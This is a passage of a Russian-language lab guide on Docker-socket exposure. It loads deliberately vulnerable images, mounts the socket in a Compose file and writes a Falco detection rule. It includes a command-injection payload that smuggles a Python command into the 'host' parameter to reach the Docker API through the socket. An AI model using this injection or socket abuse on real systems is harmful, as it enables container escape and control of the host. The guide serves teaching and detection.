## Архивы лабораторных образов

Для практики нужны два отдельных образа. Первый — `container-security-lab/control-center:1.0-vulnerable`, уязвимый сервис с интерфейсом и подключённым Docker-сокетом. Второй — `container-security-lab/control-target:1.0`, обычный целевой сервис без сокета и без командной инъекции. Разделение образов позволяет отличить первоначальный доступ от импакта на соседний контейнер.

Каждый образ опубликуем отдельным архивом и отдельным файлом SHA-256:

~~~text
practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz
practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz.sha256
practice-03-docker-socket-target_1.0_linux-amd64.tar.gz
practice-03-docker-socket-target_1.0_linux-amd64.tar.gz.sha256
~~~

Загрузим оба архива в каталог сценария:

~~~bash
mkdir -p ~/container-security-lab/scenarios/03-docker-socket
cd ~/container-security-lab/scenarios/03-docker-socket

curl --fail --location --remote-name \
  'https://raw.githubusercontent.com/Scrocisss/Statiya-bezop_kont/main/scenarios/practice-03-docker-socket_1.0_linux-amd64/practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz'
curl --fail --location --remote-name \
  'https://raw.githubusercontent.com/Scrocisss/Statiya-bezop_kont/main/scenarios/practice-03-docker-socket_1.0_linux-amd64/practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz.sha256'
curl --fail --location --remote-name \
  'https://raw.githubusercontent.com/Scrocisss/Statiya-bezop_kont/main/scenarios/practice-03-docker-socket_1.0_linux-amd64/practice-03-docker-socket-target_1.0_linux-amd64.tar.gz'
curl --fail --location --remote-name \
  'https://raw.githubusercontent.com/Scrocisss/Statiya-bezop_kont/main/scenarios/practice-03-docker-socket_1.0_linux-amd64/practice-03-docker-socket-target_1.0_linux-amd64.tar.gz.sha256'
~~~

Архивы собраны из проверенных образов и опубликованы в каталоге сценария. Проверим каждый файл отдельно:

~~~bash
sha256sum --check \
  practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz.sha256
sha256sum --check \
  practice-03-docker-socket-target_1.0_linux-amd64.tar.gz.sha256
~~~

Ожидаемый вывод:

~~~text
practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz: OK
practice-03-docker-socket-target_1.0_linux-amd64.tar.gz: OK
~~~

Контрольные суммы архивов:

~~~text
74c6438e795dc6f9f3514a3b200f96269784d348f6bc252f56a2b277d893e6d8  practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz
3463d07c63f37d428e0e8724921311675208f1006bbe9b5de48beb134f03ac35  practice-03-docker-socket-target_1.0_linux-amd64.tar.gz
~~~

Загрузим их в локальное хранилище Docker:

~~~bash
sudo docker image load \
  --input practice-03-docker-socket-control-center_1.0_linux-amd64.tar.gz
sudo docker image load \
  --input practice-03-docker-socket-target_1.0_linux-amd64.tar.gz
~~~

Проверим оба тега и пользователей по умолчанию:

~~~bash
sudo docker image inspect \
  container-security-lab/control-center:1.0-vulnerable \
  --format 'id={{.Id}} arch={{.Architecture}} user={{.Config.User}} size={{.Size}}'
sudo docker image inspect \
  container-security-lab/control-target:1.0 \
  --format 'id={{.Id}} arch={{.Architecture}} user={{.Config.User}} size={{.Size}}'
~~~

Для `Control Center` ожидаем пользователя `10001:10001`, для `Target Service` — `10002:10002`. Проверенные образы имеют идентификаторы `sha256:914deff6e3455c376a4ff9c2c0599cf805b6be37fed3e9e41dcd5a7868c0d1b5` и `sha256:c91a27babc74a41b819451e128e5fe5e6578b86965e91baa1b5a20284dd216bf` соответственно. Если контрольная сумма или идентификатор не совпадает, архив нужно скачать заново и не использовать в эксперименте.

## Проверка Docker Engine перед запуском

Сначала проверим условия на лабораторной виртуальной машине. В этой практике предполагается обычный rootful Docker Engine, управляемый службой `docker.service`.

~~~bash
sudo systemctl is-active docker
sudo test -S /var/run/docker.sock && echo 'Docker socket: present'
stat -c 'mode=%A uid=%u gid=%g owner=%U:%G path=%n' /var/run/docker.sock
sudo docker info --format \
  'server={{.ServerVersion}} security={{json .SecurityOptions}}'
~~~

Сокет обычно имеет режим `srw-rw----`, владельца `root` и группу `docker`. Точное числовое значение группы нельзя вшивать в статью: оно может отличаться между системами. Позже мы получим его командой `stat` и передадим в Compose как числовую дополнительную группу.

Если `docker info` показывает rootless-режим или сокет расположен не по адресу `/var/run/docker.sock`, остановимся перед запуском и отдельно адаптируем эксперимент. В rootless Docker граница полномочий и последствия API-вызова отличаются от rootful-сценария, поэтому смешивать эти варианты в одном выводе нельзя.

## Контролируемый ресурс хоста

Будущий API-тест должен доказать возможность управлять Docker, но не должен без необходимости читать настоящую корневую файловую систему лабораторной машины. Поэтому заранее создадим отдельный каталог с маркером. Если позже API создаст вспомогательный контейнер, ему будет разрешено подключить только этот каталог как `/host`.

~~~bash
sudo install -d \
  -o root \
  -g root \
  -m 0755 \
  /srv/container-security-lab/practice-03

printf 'owner=host\nclassification=lab-only\n' | \
  sudo tee \
  /srv/container-security-lab/practice-03/host-secret.txt \
  >/dev/null

sudo chown root:root \
  /srv/container-security-lab/practice-03/host-secret.txt
sudo chmod 0600 \
  /srv/container-security-lab/practice-03/host-secret.txt

sudo stat \
  --format='inode=%i owner=%U(%u) mode=%A(%a) size=%s' \
  /srv/container-security-lab/practice-03/host-secret.txt
~~~

Каталог и файл принадлежат `root`, а сам процесс приложения будет работать от UID 10001. Если созданный через Docker API контейнер сможет прочитать маркер, доступ будет получен не за счёт UID приложения, а за счёт полномочий Docker Engine, который создал новый контейнер с другими настройками.

Мы сознательно не подключаем к тестовому контейнеру `/` и не пытаемся читать секреты реальной системы. Возможность запросить такой mount является частью объяснения риска, но лабораторное доказательство ограничиваем отдельным каталогом.

## Конфигурация контейнера

Создадим файл Compose в каталоге практики:

~~~bash
cd ~/container-security-lab/scenarios/03-docker-socket
printf 'DOCKER_SOCKET_GID=%s\n' \
  "$(stat -c '%g' /var/run/docker.sock)" \
  > .env
vim compose.yaml
~~~

В файл поместим следующую конфигурацию:

~~~yaml
name: container-security-docker-socket

services:
  control-center:
    image: container-security-lab/control-center:1.0-vulnerable
    pull_policy: never
    container_name: lab-docker-socket
    init: true
    user: "10001:10001"
    group_add:
      - "${DOCKER_SOCKET_GID}"
    ports:
      - "0.0.0.0:8080:8080"
    read_only: true
    volumes:
      - type: bind
        source: /var/run/docker.sock
        target: /var/run/docker.sock
        read_only: false
        bind:
          propagation: rprivate
    tmpfs:
      - /tmp:rw,noexec,nosuid,nodev,size=16m
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    pids_limit: 64
    mem_limit: 128m
    cpus: 0.50
    healthcheck:
      test:
        - CMD
        - python
        - -c
        - >-
          import urllib.request;
          urllib.request.urlopen('http://127.0.0.1:8080/health', timeout=5)
      interval: 10s
      timeout: 8s
      retries: 10
      start_period: 15s
    logging:
      driver: json-file
      options:
        max-size: 10m
        max-file: "2"
    networks:
      - docker-socket-lab

  target-service:
    image: container-security-lab/control-target:1.0
    pull_policy: never
    container_name: lab-docker-target
    init: true
    user: "10002:10002"
    ports:
      - "0.0.0.0:8090:8090"
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,nodev,size=16m
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    pids_limit: 32
    mem_limit: 64m
    cpus: 0.25
    healthcheck:
      test:
        - CMD
        - python
        - -c
        - >-
          import urllib.request;
          urllib.request.urlopen('http://127.0.0.1:8090/health', timeout=5)
      interval: 10s
      timeout: 8s
      retries: 10
      start_period: 10s
    logging:
      driver: json-file
      options:
        max-size: 5m
        max-file: "2"
    networks:
      - docker-socket-lab

networks:
  docker-socket-lab:
    name: container-security-docker-socket
~~~

Публикация `0.0.0.0:8080:8080` нужна только для доступа к панели управления с физического компьютера. Порт `8090` публикует страницу целевого контейнера, чтобы изменение его состояния было видно независимо от журналов. В браузере вместо `0.0.0.0` нужно использовать реальный адрес лабораторной виртуальной машины.

Сервис `target-service` не получает Docker-сокет и не участвует в командной инъекции. Для него заданы собственные ограничения: UID 10002, только для чтения корневая файловая система, отдельный лимит памяти и отдельная health-проверка. Оба контейнера находятся в одной пользовательской сети `docker-socket-lab`, но доступ к Docker API есть только у `control-center` через смонтированный Unix-сокет.

До атаки откроем страницу целевого сервиса по адресу `http://<адрес_виртуальной_машины>:8090/`. На ней должна быть зелёная карточка `RUNNING`. Позже запрос к Docker API остановит контейнер `lab-docker-target`, и та же страница перестанет отвечать. Это даёт независимый от Falco признак воздействия на соседний контейнер.

Параметр `volumes` подключает именно Unix-сокет Docker. Поле `read_only: false` указано явно: протокол Docker Engine требует двустороннего обмена, поэтому режим только для чтения не превращает сокет в безопасный файл. Это не означает, что приложение получает доступ к обычной файловой системе хоста; оно получает возможность отправлять запросы процессу `dockerd`.

`group_add` добавляет процессу числовую дополнительную группу, которой принадлежит сокет. Это не Linux capability и не переход в UID 0. Тем не менее при типичном режиме `srw-rw---- root:docker` без этой группы процесс не сможет открыть сокет. После открытия авторизация фактически переходит к Docker Engine, а не к ограниченному пользователю внутри контейнера.

Ограничения `read_only`, `cap_drop`, `no-new-privileges`, `pids_limit`, `mem_limit` и `cpus` уменьшают побочные последствия обычного процесса, но не отменяют уже выданное подключение к управляющему сокету.

## Запуск панели

Проверим итоговую конфигурацию, не создавая контейнер:

~~~bash
sudo docker compose config --quiet
~~~

Запустим сервис и дождёмся healthcheck:

~~~bash
sudo docker compose up --detach --wait
sudo docker compose ps
~~~

В списке должны появиться два контейнера: `lab-docker-socket` со статусом `Up ... (healthy)` и публикацией `0.0.0.0:8080->8080/tcp`, а также `lab-docker-target` со статусом `Up ... (healthy)` и публикацией `0.0.0.0:8090->8090/tcp`. Если один из контейнеров стал `unhealthy`, сначала посмотрим его журнал и результат healthcheck:

~~~bash
sudo docker logs --tail 100 lab-docker-socket
sudo docker inspect lab-docker-socket \
  --format '{{range .State.Health.Log}}{{println "exit_code=" .ExitCode}}{{println .Output}}{{end}}'
sudo docker logs --tail 100 lab-docker-target
sudo docker inspect lab-docker-target \
  --format '{{range .State.Health.Log}}{{println "exit_code=" .ExitCode}}{{println .Output}}{{end}}'
~~~

Откроем панель с основной ОС по адресу `http://<адрес_виртуальной_машины>:8080/`. Должна появиться страница `Container Control Center` с карточками состояния сервиса и предупреждением о лабораторном Docker-сокете.

Отдельно откроем `http://<адрес_виртуальной_машины>:8090/`. На странице `Target Service` должна отображаться зелёная карточка `RUNNING`. Этот URL понадобится после первого обращения к Docker API: остановка `lab-docker-target` должна сделать его недоступным.

Проверим служебный endpoint отдельно:

~~~bash
curl --fail --silent --show-error \
  'http://127.0.0.1:8080/health' | jq
~~~

Ожидаемый ответ:

~~~json
{
  "status": "ok",
  "variant": "docker-socket-vulnerable"
}
~~~

Теперь проверим, что сокет действительно попал внутрь контейнера и что процесс получил ожидающую дополнительную группу:

~~~bash
sudo docker exec lab-docker-socket id
sudo docker exec lab-docker-socket \
  stat -c 'mode=%A uid=%u gid=%g type=%F' \
  /var/run/docker.sock
sudo docker inspect lab-docker-socket \
  --format '{{json .Mounts}}' | jq
sudo docker exec lab-docker-target id
sudo docker inspect lab-docker-target \
  --format '{{json .Mounts}}' | jq
~~~

В выводе для `lab-docker-socket` должен присутствовать UID 10001 и числовая группа, совпадающая с `DOCKER_SOCKET_GID`. `stat` должен показать тип `socket`, а `docker inspect` — mount с источником и назначением `/var/run/docker.sock` и признаком `RW: true`. Для `lab-docker-target` не должно быть mount Docker-сокета, а UID должен быть 10002. Эти проверки подтверждают конфигурацию, но ещё не доказывают, что приложение обращалось к Docker API.

## Штатная проверка интерфейса

Сначала выполним штатный запрос через форму панели или напрямую:

~~~bash
curl --fail --silent --show-error \
  --get \
  --data-urlencode 'host=127.0.0.1' \
  'http://127.0.0.1:8080/api/ping' | jq
~~~

В ответе должны быть команда `ping`, код возврата и её вывод. На этом шаге Docker-сокет не используется: приложение запускает только `/bin/sh` и `/bin/ping`. Это будет отрицательным тестом для будущего правила подключения к Unix-сокету.

Не будем сразу создавать контейнер через API. Сначала отправим безопасный запрос `/_ping`, который Docker Engine использует для проверки доступности. Он возвращает короткий ответ `OK` и не изменяет состояние Docker. Для этого воспользуемся уже имеющейся командной инъекцией и стандартным модулем `socket` Python.

Раскодированный фрагмент, который должен выполнить процесс внутри контейнера, выглядит так:

~~~text
127.0.0.1; python -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/var/run/docker.sock"); s.sendall(b"GET /_ping HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n\r\n"); print(s.recv(1024).decode())'
~~~

В браузере специальные символы URL необходимо кодировать. Надёжнее передать значение через `curl --get --data-urlencode`, чтобы оболочка текущего терминала не изменила кавычки, пробелы и переводы строк:

~~~bash
curl --fail --silent --show-error \
  --get \
  --data-urlencode 'host=127.0.0.1; python -c '\''import socket; s=socket.socket(socket.AF_UNIX); s.connect("/var/run/docker.sock"); s.sendall(b"GET /_ping HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n\r\n"); print(s.recv(1024).decode())'\''' \
  'http://127.0.0.1:8080/api/ping' | jq
~~~

В ответе приложения ожидается текст HTTP-ответа Docker, содержащий строку `OK`. Сам JSON приложения может дополнительно содержать диагностический вывод `ping` и служебные заголовки, поэтому искать нужно именно фрагмент ответа Docker.

В образе установлен предел длины параметра `host` — 256 символов. Запрос `/_ping` вместе с Python-кодом в него помещается. Для более длинных API-методов нельзя просто дописать все HTTP-заголовки в тот же параметр: строка будет обрезана приложением. В следующем фрагменте для остановки целевого контейнера используем короткий запрос и собираем CRLF через `bytes([13,10])`; это сохраняет эксперимент воспроизводимым и не зависит от того, как оболочка обработает управляющие символы.

До проверки телеметрии зафиксируем время:

~~~bash
LAB_SOCKET_OBSERVE_START=$(date --iso-8601=seconds)
printf '%s\n' "$LAB_SOCKET_OBSERVE_START"
~~~

Повторим штатный запрос, затем безопасную проверку `_ping`:

~~~bash
curl --fail --silent --show-error \
  --get \
  --data-urlencode 'host=127.0.0.1' \
  'http://127.0.0.1:8080/api/ping' | jq

curl --fail --silent --show-error \
  --get \
  --data-urlencode 'host=127.0.0.1; python -c '\''import socket; s=socket.socket(socket.AF_UNIX); s.connect("/var/run/docker.sock"); s.sendall(b"GET /_ping HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n\r\n"); print(s.recv(1024).decode())'\''' \
  'http://127.0.0.1:8080/api/ping' | jq
~~~

## Временное правило Falco

Стандартное правило Falco может не выделять именно подключение приложения к Docker-сокету, особенно если оно видит только общий системный вызов `connect`. Поэтому сначала создадим узкое правило наблюдения. Оно не объявляет эксплуатацию доказанной и не пытается определить, какой API-метод будет вызван дальше. Его задача — сохранить факт успешного подключения, процесс и имя Unix-сокета.

Создадим файл:

~~~bash
sudo vim /etc/falco/rules.d/03-docker-socket-observe.yaml
~~~

Содержимое:

~~~yaml
- rule: Laboratory container connected to Docker Unix socket
  desc: >
    Records Unix-domain socket connections from the deliberately vulnerable
    laboratory control-center container. This is an observation rule.
  condition: >
    evt.type = connect
    and evt.dir = <
    and container.id != host
    and container.name = "lab-docker-socket"
    and fd.typechar = 'u'
  output: >
    Laboratory container connected to Unix socket |
    evt_type=%evt.type result=%evt.res
    fd_name=%fd.name fd_type=%fd.typechar
    process=%proc.name proc_exepath=%proc.exepath
    parent=%proc.pname grandparent=%proc.aname[2]
    command=%proc.cmdline user=%user.name user_uid=%user.uid
    container_id=%container.id container_name=%container.name
  priority: NOTICE
  tags:
    - container
    - docker_socket
    - unix_socket
    - lab_observation
    - mitre_execution
    - T1609
~~~

Условие ограничивает событие контейнером практики и Unix-доменом, но пока не фильтрует имя файла сокета. Это сделано намеренно: сначала нужно увидеть, какие значения `fd.name` и `fd.typechar` выдаёт Falco с конкретным драйвером и версией ядра. После получения фактического события можно будет решить, достаточно ли пути `/var/run/docker.sock` или нужно учитывать вариант, в котором Falco сообщает имя через файловый дескриптор.

Если в стенде ещё не включён режим проверки всех совпавших правил, убедимся, что файл `/etc/falco/config.d/98-lab-rule-matching.yaml` содержит:

~~~yaml
rule_matching: all
~~~

Проверим конфигурацию и перезапустим Falco:

~~~bash
sudo falco --dry-run
echo $?
sudo systemctl restart falco-modern-bpf.service
sudo systemctl --no-pager --full \
  status falco-modern-bpf.service
~~~

Команда `falco --dry-run` должна завершиться кодом `0`, а служба — перейти в состояние `active (running)`. Если Falco сообщает об неизвестном поле или ошибке синтаксиса, перезапускать службу повторно не нужно: пришлите полный текст ошибки, потому что доступные поля зависят от версии Falco и подключённых event sources.

## Первое наблюдение подключения

После перезапуска повторим штатный запрос и запрос `_ping`, как показано выше. Затем выведем срабатывания временного правила:

~~~bash
sudo journalctl \
  -u falco-modern-bpf.service \
  --since "$LAB_SOCKET_OBSERVE_START" \
  --output=cat \
  --no-pager | \
  jq --raw-input --raw-output '
    fromjson?
    | select(.rule == "Laboratory container connected to Docker Unix socket")
    | [
        .time,
        .output_fields["evt.type"],
        .output_fields["evt.res"],
        .output_fields["fd.name"],
        .output_fields["fd.type"],
        .output_fields["proc.name"],
        .output_fields["proc.pname"],
        .output_fields["proc.cmdline"],
        .output_fields["user.uid"],
        .output_fields["container.name"]
      ]
    | @tsv
  '
~~~

Ожидаем, что штатный `ping` не создаст запись о подключении к Unix-сокету, а второй запрос даст как минимум одну строку с контейнером `lab-docker-socket`. Однако точные значения имени файла, типа дескриптора, имени процесса и родителя нельзя подставлять заранее: они зависят от того, какой процесс успел вызвать `connect`, как Falco разрешил путь и как оболочка BusyBox выполнила Python-команду.

> **ПРИШЛИТЕ ВЫВОД № 1.** На этом месте остановимся. Пришлите полный вывод команды выше, JSON-документ этого события из Elasticsearch (если он уже появился в индексе `falco-*`), вывод `sudo docker compose ps` и результат проверки страницы `http://<адрес_виртуальной_машины>:8090/`. Если строк Falco нет, дополнительно пришлите вывод `sudo falco --dry-run`, `sudo docker inspect lab-docker-socket --format '{{json .Mounts}}'` и `sudo docker exec lab-docker-socket id`. По этим данным мы уточним поля окончательного правила и продолжим практику в `abzac15.md`: проверим `/version`, выберем совместимую версию API, остановим и восстановим `lab-docker-target` через Docker API, сопоставим событие Falco с `docker events` и оформим запросы Elasticsearch/Kibana.
